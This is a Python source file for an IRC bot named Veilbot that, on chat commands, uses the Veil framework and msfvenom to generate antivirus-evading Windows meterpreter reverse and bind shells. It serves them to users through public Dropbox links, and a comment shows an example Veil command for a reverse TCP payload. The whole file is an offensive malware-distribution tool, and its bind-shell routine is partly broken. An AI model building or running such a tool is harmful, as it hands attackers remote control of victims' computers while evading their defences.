#!/usr/bin/env python
'''
@author: Moloch
@copyright: GPLv3
@version: 0.1

An IRC bot that automatically generates av-resistant 
meterpreter backdoors.

'''


import os
import sys
import time
import shutil
import logging
import sqlite3
import ConfigParser

from models import dbsession, create_tables, \
    User, Payload, DBFILE_NAME
from argparse import ArgumentParser
from twisted.application import internet
from twisted.words.protocols import irc
from twisted.internet import reactor, protocol

# Veil imports
from modules.common import controller as veil_controller
from modules.common import messages
from modules.common import supportfiles
from config import veil

### Constants
DEFAULT_CONFIG = 'config/veilbot.cfg'


### Channel
class ChannelSettings(object):

    is_muted = False

    def __init__(self, name, password=None, ignore=False):
        if name[0] == '&' or ignore:
            self.name = name
        else: 
            self.name = "#" + name
        if password is None or password.lower() == '__none__':
            self.password = None
        else:
            self.password = password

    def __eq__(self, other):
        return self.name == str(other)

    def __ne__(self, other):
        return not self == other

    def __str__(self):
        return self.name


class IRCArgumentParser(ArgumentParser):
    
    def error(self, message):
        ''' Override default parser's error() '''
        raise ValueError(message)


# Reverse shell parser
reverseShellParser = IRCArgumentParser()
reverseShellParser.add_argument('--lhost',
    dest='lhost',
    required=True,
)
reverseShellParser.add_argument('--lport',
    dest='lport',
    default="4444",
)
reverseShellParser.add_argument('--protocol',
    dest='protocol',
    default="tcp",
)
reverseShellParser.add_argument('--cryptor',
    dest='cryptor',
    default='AESVirtualAlloc',
)

# Bind shell parser
bindShellParser = IRCArgumentParser()
bindShellParser.add_argument('--lport',
    dest='lport',
    default="4444",
)
bindShellParser.add_argument('--cryptor',
    dest='cryptor',
    default='AESVirtualAlloc',
)


### Bot
class Veilbot(irc.IRCClient):
    '''
    IRC Bot
    '''

    nickname = "veil"
    realname = "Veilbot"
    channels = {}
    is_muted = False
    defaults = {
        'level': 'debug',
        'nickname': "veil",
        'realname': "Veilbot",
    }

    def initialize(self):
        ''' 
        Because twisted is fucking stupid and won't let you use super/init 
        '''
        self.public_commands = {
            "!help": self.help,
            "!mute": self.muteBot,
            "!stfu": self.muteBot,

            # Actual commands
            "!bind": self.bind,
            "!reverse": self.reverse,
            "!history": self.history,
        }
        self.protocols = ['tcp', 'tcp_rc4', 'http', 'https']
        self.cryptors = ['AESVirtualAlloc']

    def __dbinit__(self):
        ''' Initializes the SQLite database '''
        logging.info("Initializing SQLite db ...")
        if not os.path.exists(DBFILE_NAME):
            logging.info("Creating SQLite tables")
            dbConn = sqlite3.connect(DBFILE_NAME)
            dbConn.close()
            create_tables()

    def config(self, filename=DEFAULT_CONFIG):
        ''' Load settings from config file '''
        logging.info('Loading config from: %s' % filename)
        config = ConfigParser.SafeConfigParser(self.defaults)
        config.readfp(open(filename, 'r'))
        self.__logging__(config)
        self.__system__(config)
        self.__channels__(filename)

    def __logging__(self, config):
        ''' Configure logging module '''
        logLevel = config.get("Logging", 'level')
        logging.getLogger().setLevel(logging.DEBUG)

    def __system__(self, config):
        ''' Configure system settings '''
        self.nickname = config.get("System", 'nickname')
        logging.info('Config system bot nickname (%s)' % self.nickname)
        self.realname = config.get("System", 'realname')
        logging.info('Config system bot realname (%s)' % self.realname)
        self.dropbox_lpath = config.get("Dropbox", 'share_url')
        self.dropbox_lpath = config.get("Dropbox", 'dropbox_lpath')
        if self.dropbox_lpath.endswith('/'):
            self.dropbox_lpath = self.dropbox_lpath[:-1]
        self.share_url = config.get("Dropbox", 'share_url')
        self.share_lpath = config.get("Dropbox", 'share_lpath')
        if self.share_lpath.endswith('/'):
            self.share_lpath = self.share_lpath[:-1]

    def __channels__(self, filename):
        ''' Read channels to join from config file '''
        config = ConfigParser.SafeConfigParser()
        config.readfp(open(filename, 'r'))
        self.channel_pairs = config.items("Channels")

    def connectionMade(self):
        ''' When we make a succesful connection to a server '''
        irc.IRCClient.connectionMade(self)

    def connectionLost(self, reason):
        ''' Auto-reconnect on dropped connections '''
        irc.IRCClient.connectionLost(self, reason)
        logging.error("Disconnected from server: " + str(reason))

    def signedOn(self):
        ''' Called when bot has succesfully signed on to server '''
        self.__dbinit__()
        if not 0 < len(self.channel_pairs):
            logging.warning("No channels to join.")
        for key_pair in self.channel_pairs:
            channel = ChannelSettings(key_pair[0], key_pair[1])
            self.channels[channel.name] = channel
            if channel.password is None:
                self.join(channel.name)
            else:
                self.join(channel.name, channel.password)

    def joined(self, channel):
        ''' Called when the bot joins the channel '''
        logging.info("Joined channel %s" % channel)
        self.display(self.nickname, channel, "My name is %s, I have come to destroy you." % self.nickname)

    def alterCollidedNick(self, nickname):
        ''' Avoids name collisions '''
        logging.info("Nickname collision; chaned to: " + nickname + '^')
        return nickname + '^'

    def privmsg(self, user, channel, msg):
        ''' This will get called when the bot receives a message '''
        user = user.split('!', 1)[0].lower()
        if channel == self.nickname:
            logging.debug("Private message received; response channel is '%s'" % (user,))
            channel = user
        if msg.startswith("!"):
            self.parseCommand(user, channel, msg)
        else:
            logging.debug("[Message]: <User: %s> <Channel: %s> <Msg: %s>" % (user, channel, msg))

    def parseCommand(self, user, channel, msg):
        ''' Call whatever function corisponds to the command '''
        command = msg.split(" ")[0].lower()
        msg = ' '.join(msg.split(' ')[1:])
        if command in self.public_commands:
            dbuser = self.get_user(user)
            logging.debug("[Command]: <User: %s> <Channel: %s> <Msg: %s>" % (dbuser, channel, msg))
            self.public_commands[command](dbuser, channel, msg)

    def muteBot(self, user, channel, msg):
        ''' Toggle mute on/off '''
        channel_settings = self.channels.get(channel, None)
        if channel_settings is not None:
            if channel_settings.is_muted:
                channel_settings.is_muted = False
                self.display(user, channel, "Mute: OFF - Responses will be public")
            else:
                self.display(user, channel, "Mute: ON - Responses will be private")
                channel_settings.is_muted = True
        else:
            self.display(user, channel, "Cannot mute this channel.")

    def display(self, user, channel, message, whisper=False):
        ''' Intelligently wraps msg, based on mute setting '''
        channel_settings = self.channels.get(channel, None)
        if whisper or (channel_settings is not None and channel_settings.is_muted):
            display_channel = user
        else:
            display_channel = channel
        self.msg(display_channel, message.encode('ascii', 'ignore'))

    def get_user(self, nick):
        user = User.by_nick(nick)
        if user is None:
            logging.info("Creating new user '%s'" % nick)
            user = User(nick=nick)
            dbsession.add(user)
            dbsession.flush()
        return user

    def validate_ip_address(self, ip):
        ip_address = filter(lambda char: char in '1234567890.', ip)
        if 0 < len(ip_address) <= len("255.255.255.255"):
            return ip_address
        else:
            return None

    def validate_port(self, port):
        ''' Validate we got a real port number '''
        try:
            return 1 < int(port) < 65535
        except:
            return False

    # Actual commands
    def bind(self, user, channel, msg):
        ''' Create a bind shell '''
        try:
            args = bindShellParser.parse_args(msg.split())
            # Check lport
            if self.validate_port(args.lport):
                msfoptions.append("LPORT=%s" % args.lport)
            else:
                raise ValueError("Invalid lport number")
            fpath = self.__generate__(args)
            #url = self.__dropbox__(fpath)
            #self.display(user, channel, "Shell Download: %s" % (url,))
        except ValueError as error:
            self.display(user, channel, "Error: %s" % str(error))

    def reverse(self, user, channel, msg):
        ''' Create a reverse shell '''
        msfpayload = 'windows/meterpreter/reverse_'
        msfoptions = []
        try:
            args = reverseShellParser.parse_args(msg.split())
            # Check protocol
            if args.protocol in self.protocols:
                msfpayload += args.protocol
            else:
                raise ValueError("Invalid protocol")
            # Check lport
            if self.validate_port(args.lport):
                msfoptions.append("LPORT=%s" % args.lport)
            else:
                raise ValueError("Invalid lport number")
            # Check lhost
            ip_address = self.validate_ip_address(args.lhost)
            if ip_address is not None:
                msfoptions.append("LHOST=%s" % ip_address)
            else:
                raise ValueError("Invalid lhost ip address")
            # Check cryptors
            if args.cryptor in self.cryptors:
                cryptor = args.cryptor
            else:
                raise ValueError("Invalid cryptor")
            self.display(user, channel, "Generating payload, please wait ...")
            # Flush buffers?
            file_path = self.__generate__(msfpayload, msfoptions, cryptor)
            url = self.__dropbox__(user, file_path)
            self.display(user, channel, "Shell Download: %s" % (url,))
        except ValueError as error:
            self.display(user, channel, "Error: %s" % error)
    
#./Veil.py 
# -l python 
# -p AESVirtualAlloc 
# -o foobar 
# --msfpayload windows/meterpreter/reverse_tcp 
# --msfoptions LHOST=192.168.1.1 LPORT=443

    def __generate__(self, msfpayload, msfoptions, cryptor, language='python'): 
        ''' Gerenate shell with args '''
        logging.debug("msfpayload: %s" % msfpayload)
        logging.debug("msfoptions: %s" % msfoptions)
        logging.debug("cryptor: %s" % cryptor)
        controller = veil_controller.Controller()
        options = {}
        options['msfvenom'] = [msfpayload, msfoptions]
        controller.SetPayload(language, cryptor, options)
        file_name = "veil"
        file_path = controller.OutputMenu(
            controller.payload, 
            controller.GeneratePayload(), 
            showTitle=False, 
            interactive=False, 
            OutputBaseChoice=file_name,
        )
        return file_path

    def __dropbox__(self, user, output):
        ''' Get public dropbox link '''
        file_name = os.path.basename(output)
        extension = self.share_lpath +'/'+ user.uuid + '/'
        dst_path = self.dropbox_lpath + '/' + extension
        if not os.path.exists(dst_path):
            logging.debug("Mkdir: %s" % (dst_path))
            os.mkdir(dst_path)
        if os.path.exists(output):
            logging.debug("Copy: %s -> %s" % (
                output, dst_path + file_name
            ))
            shutil.copy(output, dst_path + file_name)
        else:
            raise ValueError("Failed to generate payload")
        return self.share_url + extension + file_name

    def history(self, user, channel, msg):
        ''' Retrieve a user's history '''
        user = User.by_nick(user)

    def help(self, user, channel, msg):
        ''' Displays a helpful messages '''
        self.display(user, channel, " > Commands: Veilbot ")
        self.display(user, channel, "-------------------------------------")
        self.display(user, channel, "    !bind: Create a bind shell ")
        self.display(user, channel, " !reverse: Create a reverse shell")
        self.display(user, channel, " !history: View you previously generated shells")


### Factory
class VeilbotFactory(protocol.ClientFactory):
    '''
    Twisted IRC bot factory
    '''

    def buildProtocol(self, addr):
        ''' Creates factory '''
        bot = Veilbot()
        bot.initialize()
        bot.config(self.configFilename)
        bot.factory = self
        return bot

    def clientConnectionLost(self, connector, reason):
        ''' If we get disconnected, reconnect to server. '''
        connector.connect()

    def clientConnectionFailed(self, connector, reason):
        ''' When connection fails '''
        logging.warn("Connection failed: " + str(reason))
        reactor.stop()

### Main
if __name__ == '__main__':
    logging.basicConfig(
        format = '\r\033[1m[%(levelname)s]\033[0m %(asctime)s - %(message)s', 
        level=logging.INFO
    )
    factory = VeilbotFactory()
    config = ConfigParser.SafeConfigParser({'port': '6667'})
    config.readfp(open(DEFAULT_CONFIG, 'r'))
    factory.configFilename = DEFAULT_CONFIG
    server = config.get("Server", 'domain')
    port = config.getint("Server", 'port')
    reactor.connectTCP(server, port, factory)
    logging.info("Starting reactor core ...")
    reactor.run()
